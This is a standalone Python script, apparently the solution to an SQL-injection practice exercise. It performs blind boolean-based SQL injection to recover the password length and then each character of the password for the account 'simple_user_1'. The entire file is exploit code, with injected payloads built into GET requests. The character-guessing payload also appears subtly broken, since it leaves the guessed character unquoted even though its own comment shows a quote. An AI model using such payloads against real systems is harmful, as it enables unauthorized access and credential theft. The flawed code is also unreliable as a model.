#!/usr/bin/python3
import requests

characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
username = "simple_user_1"
password = ""
site = "http://supersecurity.cf/exercises/sqli-3.php?username="
password_length = -1

# Guess the password length
for i in range(100):
    # Payload: simple_user_1' and length(password) = 5 and '1' = '1
    target = site + "simple_user_1' and length(password) = " + str(i) + " and '1' = '1"
    response = requests.get(target)
    html_response = str(response.content, 'utf-8')
    if 'Success' in html_response:
        password_length = i

print("[*] Password Length: " + str(password_length))

# Guess the characters in the password
for i in range(password_length):
    for char in characters:
        # Payload: simple_user_1' and substring(password, 1, 1) = '1
        target = site + "simple_user_1' and substring(password, " + str(i+1) + ", 1) = " + str(char) + " and '1' = '1"
        response = requests.get(target)
        html_response = str(response.content, 'utf-8')
        if 'Success' in html_response:
            password += char

print("[*] Password: " + password)

